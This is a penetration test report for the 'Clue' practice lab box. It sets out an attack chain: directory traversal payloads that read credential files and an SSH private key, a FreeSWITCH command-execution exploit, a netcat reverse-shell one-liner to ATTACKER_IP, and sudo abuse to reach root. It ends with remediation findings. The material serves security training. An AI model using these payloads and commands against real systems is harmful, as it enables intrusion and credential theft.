# PG Practice Clue - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-16

---

## 0. Lesson Learned

Sometimes you need to chain exploits to make anything work.

Check `/proc/self/cmdline` and `.bash_history`.

You can find local flags in obscure locations with `find \ -name local.txt 2>/dev/null`.

---

## 1. Executive Summary

A full compromise of the target system was achieved through a chain of vulnerabilities including SMB misconfiguration, Cassandra Web directory traversal, exposed credentials, and unsafe sudo permissions. Initial access was obtained via FreeSWITCH command execution, followed by lateral movement and privilege escalation to root through SSH key abuse.

---

## 2. Scope

- **Target:** 192.168.160.240
- **Environment:** PG Practice Clue
- **Testing Window:** 2026-4-13 to 2026-4-16
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

Command:

```
nmap -sC -sV 192.168.160.240 -T4 -oA clue_tcp
```

Output (relevant):

```
22/tcp    open  ssh        OpenSSH 7.9p1 Debian
80/tcp    open  http       Apache 2.4.38
139/tcp   open  netbios-ssn Samba smbd
445/tcp   open  netbios-ssn Samba smbd
3000/tcp  open  http       Thin httpd
8021/tcp  open  freeswitch-event FreeSWITCH
```

Interpretation:

Multiple services were exposed, including SMB, web services, and FreeSWITCH, providing several attack vectors.

---

## 5. Enumeration

### SMB Enumeration

Command:

```
smbclient -L //192.168.160.240 -N
```

Output (relevant):

```
backup
```

Interpretation:

An accessible SMB share named backup was identified.

Command:

```
smbclient //192.168.160.240/backup -N -c 'recurse ON; prompt OFF; mget *'
```

Interpretation:

Files were downloaded for offline analysis.

### FreeSWITCH Credential Discovery

Command:

```
cat /freeswitch/etc/freeswitch/autoload_configs/event_socket.conf.xml
```

Output:

```
password="ClueCon"
```

Interpretation:

Default FreeSWITCH password identified.

### Cassandra Web Enumeration (Port 3000)

Command:

```
GET /../../../../../../../../../../etc/passwd
```

Interpretation:

Directory traversal vulnerability confirmed in Cassandra Web (v0.5.0).

Command:

```
GET /../../../../../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml
```

Output:

```
password="StrongClueConEight021"
```

Interpretation:

Updated FreeSWITCH password obtained.

Command:

```
GET /../../../../../../../../../proc/self/cmdline
```

Output:

```
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

Interpretation:

Credentials for user cassie were retrieved.

---

## 6. Initial Access

### FreeSWITCH Command Execution

Command:

```
python3 freeswitch-exploit.py 192.168.160.240 id
```

Output:

```
uid=998(freeswitch) gid=998(freeswitch)
```

Interpretation:

Command execution achieved as freeswitch user.

### Reverse Shell

Command:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP 80 >/tmp/f
```

Output:

```
Connection received
```

Interpretation:

Reverse shell established.

---

## 7. Post-Exploitation

### User Pivot to cassie

Command:

```
su cassie
Password: SecondBiteTheApple330
```

Interpretation:

Credentials successfully reused to pivot to cassie.

### Shell Upgrade

Command:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Interpretation:

Interactive shell obtained.

### Sudo Privileges

Command:

```
sudo -l
```

Output:

```
(ALL) NOPASSWD: /usr/local/bin/cassandra-web
```

Interpretation:

User can run Cassandra Web as root without password.

---

## 8. Privilege Escalation

### Abusing Cassandra Web (Root)

Command:

```
sudo /usr/local/bin/cassandra-web -u cassie -p SecondBiteTheApple330 -B 127.0.0.1:5555
```

Interpretation:

Service started as root locally.

### Directory Traversal as Root

Command:

```
curl --path-as-is http://127.0.0.1:5555/../../../../../../../../home/anthony/.ssh/id_rsa
```

Output:

```
-----BEGIN OPENSSH PRIVATE KEY-----
```

Interpretation:

Private SSH key for anthony obtained.

### Extract Bash History

Command:

```
curl --path-as-is http://127.0.0.1:5555/../../../../../../../../home/anthony/.bash_history
```

Output:

```
ssh-keygen ... >> /root/.ssh/authorized_keys
```

Interpretation:

Anthony’s key is authorized for root SSH access.

### Root Access

Command:

```
ssh -i id_rsa root@192.168.160.240
```

Output:

```
root@clue:~#
```

Interpretation:

Full root access achieved.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /var/lib/freeswitch/local.txt
```

**Root Flag**: *REDACTED*

```
cat /root/proof_youtriedharder.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** SMB Anonymous Access Allowing Sensitive File Retrieval

**Severity:** Medium

**Description:**
An SMB share allowed unauthenticated access to files containing sensitive information.

**Impact:**
Attackers could retrieve configuration files, credentials, or other sensitive data to aid further compromise.

**Recommendation:**
Disable anonymous access to SMB shares, enforce authentication, and apply least-privilege permissions.

### **Finding:** Directory Traversal Leading to Arbitrary File Read

**Severity:** Critical

**Description:**
The application was vulnerable to directory traversal, allowing attackers to access arbitrary files on the system.

**Impact:**
Attackers could read sensitive files such as configuration files, credentials, and SSH keys.

**Recommendation:**
Sanitize user input, enforce strict path validation, and restrict file access to intended directories only.

### **Finding:** Hardcoded Credentials in Configuration Files

**Severity:** High

**Description:**
Credentials were stored in configuration files and exposed through application vulnerabilities.

**Impact:**
Attackers could retrieve credentials and use them to authenticate or execute commands on the system.

**Recommendation:**
Store credentials securely using protected storage mechanisms and restrict access to configuration files.

### **Finding:** Unauthenticated Service Allowing Command Execution

**Severity:** Critical

**Description:**
A network service (e.g., FreeSWITCH event socket) allowed unauthenticated users to execute commands.

**Impact:**
Attackers could execute arbitrary commands and gain shell access to the system.

**Recommendation:**
Restrict access to the service, enforce authentication, and limit exposure to trusted networks.

### **Finding:** Misconfigured Sudo Permissions Allowing Privileged Execution

**Severity:** Critical

**Description:**
A user was permitted to execute a service or application (e.g., Cassandra Web) with root privileges via sudo without restrictions.

**Impact:**
Attackers could escalate privileges to root and fully compromise the system.

**Recommendation:**
Remove unnecessary sudo permissions, restrict execution to required commands only, and enforce least-privilege principles.

### **Finding:** SSH Key Misconfiguration Allowing Root Access

**Severity:** Critical

**Description:**
An SSH key was configured to allow direct root login without sufficient restrictions.

**Impact:**
Attackers possessing the private key could gain immediate root access to the system.

**Recommendation:**
Disable root SSH login, restrict authorized keys, enforce key passphrases, and audit SSH configurations regularly.

---

## 11. Appendix

FreeSWITCH Pentesting -
[https://x7331.gitbook.io/boxes/services/tcp/freeswitch-8021](https://x7331.gitbook.io/boxes/services/tcp/freeswitch-8021)

Cassandra Web 0.5.0 Remote File Read - 
[https://www.exploit-db.com/exploits/49362](https://www.exploit-db.com/exploits/49362)

FreeSWITCH Command Execution Exploit - 
[https://www.exploit-db.com/exploits/47799](https://www.exploit-db.com/exploits/47799)